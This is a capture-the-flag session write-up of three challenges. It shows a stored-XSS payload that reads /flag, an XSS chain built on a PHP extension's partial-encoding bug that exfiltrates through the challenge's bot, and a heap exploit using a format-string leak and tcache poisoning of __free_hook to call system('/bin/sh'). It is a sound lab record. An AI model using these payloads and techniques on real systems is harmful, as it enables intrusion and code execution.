# Session 2026-07-04: Three CTF Challenges (LemonShelf, XDD, 67 login system)

## Challenge Summary

| Challenge | Category | Points | Status | Key Technique |
|---|---|---|---|---|
| LemonShelf | Web | 289 | ✅ Solved | Stored XSS in admin bot review flow |
| XDD | XSS | 500 | 🔄 Exploit ready | folio.so PHP extension bug: only first special char HTML-encoded |
| 67 login system | Pwn | 365 | 🔄 RCE achieved | Format string + heap overflow + UAF → tcache poisoning `__free_hook` |

---

## LemonShelf (Web, 289pts)

### Vulnerability
- `author_note` field in `/submit` endpoint has **stored XSS** when in draft/pending state
- Admin bot reviews pending submissions → XSS triggers
- After approval, content is escaped

### Exploit
```html
<img src=x onerror="fetch('/flag').then(r=>r.text()).then(t=>{document.body.innerHTML+='FLAG:'+t})">
```

### Key Insight
Admin bot only visits pending/draft submissions. Submit malicious payload, wait for bot review, flag exfiltrates.

---

## XDD (XSS, 500pts)

### Architecture
- PHP + folio.so extension + Python reviewer bot (port 8081) + Private service (port 9100)
- CTF-Instancer for instance creation

### Vulnerability: `folio_frame()` bug
```c
// zif_folio_frame only encodes FIRST special character
// name = "&<script>alert(1)</script>" 
// First & → &, rest raw → XSS
```

### CSP
```
script-src 'nonce-RANDOM'
connect-src 'self' http://127.0.0.1:9100
```

### Attack Chain
1. Create note with `name = "&<img src=x onerror=...>"`
2. Get `view.php?id=...` URL
3. Solve PoW: SHA256(ticket:stamp) starts with 5 zeros
4. Submit to reviewer bot (port 8081)
5. Bot triggers XSS → fetch `http://127.0.0.1:9100/archive/receipt` → POST to `/drop.php?slot=exfil`
6. Read flag from `/drop.php?slot=exfil`

### PoW Solver
```python
def solve_pow(ticket, difficulty=5):
    prefix = '0' * difficulty
    i = 0
    while True:
        stamp = str(i)
        if hashlib.sha256(f"{ticket}:{stamp}".encode()).hexdigest().startswith(prefix):
            return stamp
        i += 1
```

---

## 67 login system (Pwn, 365pts)

### Binary Info
- ELF 64-bit, PIE, no canary, NX, Partial RELRO
- IPv6 service on port 16767

### Three Vulnerabilities

| Vuln | Location | Impact |
|---|---|---|
| Format string | `show` uses `printf(user_struct)` | Leak PIE/HEAP/LIBC |
| Heap overflow | `update` reads 0x200 into 0x48 struct | Overflow adjacent chunks |
| UAF | `delete` calls `fclose` then `free`, slot ptr cleared last | Use-after-free on FILE* |

### Struct Layout (0x48 bytes)
```
struct user {
    char username[0x40];  // 64 bytes
    FILE* fp;             // 8 bytes
}
```

### Leaks (Format String)
- `%6$p` = HEAP (points to user struct)
- `%7$p` = PIE (return address, base = leak - 0x1676)
- `%11$p` / `%17$p` = LIBC (ends with 0x741 / 0xb96)

### Libc Base Calculation
```
LIBC leak ending in 0x741 → offset 0x2a741 → libc_base = leak - 0x2a741
Verified page-aligned: 0x7f2a2e3c6000
```
- `system = libc_base + 0x50d70`
- `__free_hook = libc_base + 0x2198d8`

### Tcache Key Discovery
```
Freed chunk fd (when next=0) = tcache_key
Read via: put address in username, use %5$s to read
tcache_key = heap_base >> 12
```

### Exploit: Tcache Poisoning `__free_hook`

```python
# 1. Register format string user (slot 0) - leak PIE + HEAP
# 2. Register 2 normal users (slots 1, 2)
# 3. Delete user 1 → chunk enters tcache
# 4. Overflow slot 0:
#    payload = 0x40 'A' + 8 byte FILE* + 8 byte padding + 8 byte target_fd
#    target_fd = (free_hook - 0x10) ^ tcache_key
# 5. Realloc slot 1 → gets chunk at free_hook - 0x10
# 6. Write system to free_hook
# 7. Register "/bin/sh" or "cat /flag.txt" as user 2
# 8. Delete user 2 → free("/bin/sh") → system("/bin/sh")
```

### Verified Working
- `system("sleep 5")` executes → 6 second delay observed
- Confirms `__free_hook = system` works

### Output Capture Issue
- `system("cat /flag.txt")` executes but output not visible on socket
- Tried: `>&0`, `>&2`, `tee`, file write + read
- Root cause: stdout/stderr may not be connected to socket after fork/exec
- Need: format string read of `/tmp/flag` after system writes it, or overwrite `fwrite@GOT` with `system` so `show()` executes username

### Alternative: Overwrite `fwrite@GOT`
- `show()` does `fwrite("username: ", ...) then fwrite(username, ...)`
- If `fwrite = system`, then `fwrite(username)` = `system(username)`
- Register user with `cat /flag.txt` as username → `show()` executes it

---

## Reusable Patterns for Future CTFs

### 1. Format String Arbitrary Read
```
# Put target address in username (64 bytes = 8 QWORDs max)
# pos 5 points to username buffer start
# %5$s reads from that address
# Can chain multiple addresses for multiple reads
```

### 2. Tcache Key Leak
```
# After freeing a chunk, its fd = tcache_key (since next=0)
# Put freed chunk address in username, use %5$s to read
# tcache_key = heap_base >> 12
```

### 3. Sleep-based RCE Confirmation
```
# When system() executes but output invisible
# system("sleep 5") → observable delay
# Confirms RCE without needing output capture
```

### 4. folio.so Bug Pattern
```
# Library only sanitizes FIRST occurrence of special chars
# Input: "&<payload>" → "&<payload>" (rest raw)
# Check all string-handling extensions for similar bugs
```

### 5. Admin Bot XSS Flow
```
# Stored XSS in pending/review state
# Bot visits → triggers XSS
# After approval: escaped
# Timing: submit → wait for bot → exfil
```

---

## Files Created This Session

- `scripts/67_login_exploit.py` - Full tcache poisoning exploit
- `scripts/xdd_exploit.py` - XDD complete exploit with PoW
- `scripts/lemonshelf_xss.py` - LemonShelf XSS payload generator

---

## Lessons Learned

1. **Always verify libc base with page alignment** - multiple offsets may work, only page-aligned is correct
2. **Tcache key changes per run** - must leak it dynamically via freed chunk fd
3. **Format string position 5 = username buffer** - reliable for arbitrary read
4. **System output capture is tricky** - when output invisible, use sleep for confirmation, then find alternative exfil
5. **CTF-Instancer requires local solve first** - whale120 instancer says "make sure you already local solved"
6. **folio.so bug** - only first special char encoded, rest raw; check all similar extensions